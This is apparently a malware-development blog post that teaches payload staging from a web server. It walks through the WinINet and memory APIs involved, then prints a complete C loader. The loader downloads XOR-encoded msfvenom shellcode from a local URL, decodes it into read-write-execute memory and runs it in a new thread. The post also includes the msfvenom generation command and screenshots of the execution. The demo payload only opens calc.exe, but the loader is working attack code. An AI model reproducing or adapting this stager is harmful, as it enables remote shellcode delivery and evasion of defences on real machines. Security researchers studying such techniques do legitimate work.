---
layout: post
title: "Payload Staging - webserver"
date: 2026-03-26 13:47:00 +0000
tags: [Malware Development]
categories: [Malware Development]
---

Payload Staging - webserver
-------

Some malware does not carry its payload within itself. Instead, it hides the payload somewhere else. One common method is to host it on a web server.

For our payload staging purpose, we need a server. In this case, we will use a Python server to host our encoded payload.

The encoded payload is a simple one that executes calc.exe. It was generated using the command:
`msfvenom -p windows/x64/exec CMD=calc.exe -f c`

and it was encoded using `XOR` key `0x1337`. `:)`


## Before Starting - Faimilar WINAPIs 

Let’s get familiar with some Windows APIs that will be used to successfully fetch and execute our shellcode. 

- [InternetOpenW](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenw) -  Used to initialize an application’s use of WinINet functions. In other words, it opens an internet session handle that allows other WinINet API  to perform their operations.
```
HINTERNET InternetOpenW(
  [in] LPCWSTR lpszAgent,
  [in] DWORD   dwAccessType,
  [in] LPCWSTR lpszProxy,
  [in] LPCWSTR lpszProxyBypass,
  [in] DWORD   dwFlags
);
```

- [InternetOpenUrlW ](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurlw) - Open a connection to a specified URL. 
```
HINTERNET InternetOpenUrlW(
  [in] HINTERNET hInternet, // handle form InternetOpenW
  [in] LPCWSTR   lpszUrl, // URL where our payload file is
  [in] LPCWSTR   lpszHeaders,
  [in] DWORD     dwHeadersLength,
  [in] DWORD     dwFlags, // flags suitable // we would use 2
  [in] DWORD_PTR dwContext
);
```

- [InternetReadFile](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile) - Read the data from web handle created by `InternetOpenUrlW`. 

```
BOOL InternetReadFile(
  [in]  HINTERNET hFile, // handle from InternetOpenUrlW
  [out] LPVOID    lpBuffer, // Buffer for payload
  [in]  DWORD     dwNumberOfBytesToRead, 
  [out] LPDWORD   lpdwNumberOfBytesRead
);
```

- [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) - Reserves, commits, or changes the state of a region of pages in the virtual address space of the calling process. Memory allocated by this function is automatically initialized to zero.

```
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect // to execute
);
```

- [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) - Creates the thread to execute in the address space of calling process. 


```
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress, // address to our payload
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);
```

- Rest APIs normal or used to free handles or addresses. I know you are pretty familar with those. 

## LOGIC ?

So, We know the API's now what ? 


- Call `InternetOpenW` to initialize a WinINet session and obtain an internet handle.

- Call `InternetOpenUrlW` to open a connection to the specified URL (`http://127.0.0.1:8080/calc.bin`) and get a handle to the remote file.

- Allocate a buffer using `malloc` to temporarily store the downloaded payload.

- Call `InternetReadFile` to read the payload data from the web server into the allocated buffer.

- Call `VirtualAlloc` to allocate executable memory with `PAGE_EXECUTE_READWRITE` permissions for the decoded payload.

- Decode the payload using a simple XOR operation:
  - Even bytes are XORed with `0x13`
  - Odd bytes are XORed with `0x37`

- Clear the payload buffer using `memset`

- Call `CreateThread` to create a new thread and execute the decoded payload from the allocated memory.

- Call `WaitForSingleObject` to wait for the thread to finish execution.

- Clean up resources:
  - Close the thread handle
  - Free allocated memory using `VirtualFree` and `free`
  - Close internet handles using `InternetCloseHandle`

- Call `InternetSetOptionW` to notify the system of any changes to internet settings.


  
---

``` c
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")


int main(void) {
    HINTERNET hinternet = InternetOpenW(NULL, NULL, NULL, NULL, 0);
    if (!hinternet) return 1;


    HINTERNET hInternetFile = InternetOpenUrlW(hinternet,
        L"http://127.0.0.1:8080/calc.bin",
        NULL, 0,
        INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
        0);
    if (!hInternetFile) { InternetCloseHandle(hinternet); return 1; }


    const DWORD bufferSize = 1024;
    PBYTE pPayload = (PBYTE)malloc(bufferSize);
    if (!pPayload) { InternetCloseHandle(hInternetFile); InternetCloseHandle(hinternet); return 1; }

    printf("allocated address for shellcode ----> 0x%p\n", (void*)pPayload);

    DWORD bytesRead = 0;
    if (!InternetReadFile(hInternetFile, pPayload, bufferSize, &bytesRead)) {
        free(pPayload);
        InternetCloseHandle(hInternetFile);
        InternetCloseHandle(hinternet);
        return 1;
    }

// Allocating page with all three rwx permission. 
    PBYTE pAllocadd = (PBYTE)VirtualAlloc(NULL, bytesRead, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pAllocadd) {
        free(pPayload);
        InternetCloseHandle(hInternetFile);
        InternetCloseHandle(hinternet);
        return 1;
    }
    printf("allocated address for decoded shellcode 0x%p\n", (void*)pAllocadd);


    for (DWORD i = 0; i < bytesRead; i += 2) {
        pAllocadd[i] = pPayload[i] ^ 0x13;
        pAllocadd[i + 1] = pPayload[i + 1] ^ 0x37;
    }
    memset(pPayload, 0, bytesRead);


    // CreateThread uses the address of the decoded payload as the entry point.
// Once the thread is created, execution begins from that address.
    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAllocadd, NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);


    VirtualFree(pAllocadd, 0, MEM_RELEASE);
    free(pPayload);
    InternetCloseHandle(hInternetFile);
    InternetCloseHandle(hinternet);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
    return 0;
}

```


Execution
--- 

Getting encoded Payload with InternetReadFile

![encoded payload](/assets/img/payload_staging_webserver/Fetching_the_payload_from_server.png)

Decoding the payload

![decoded payload](/assets/img/payload_staging_webserver/Decoded%20shellcode.png)

Exectuting shellcode using thread

![calc_execution](/assets/img/payload_staging_webserver/calculator.png)


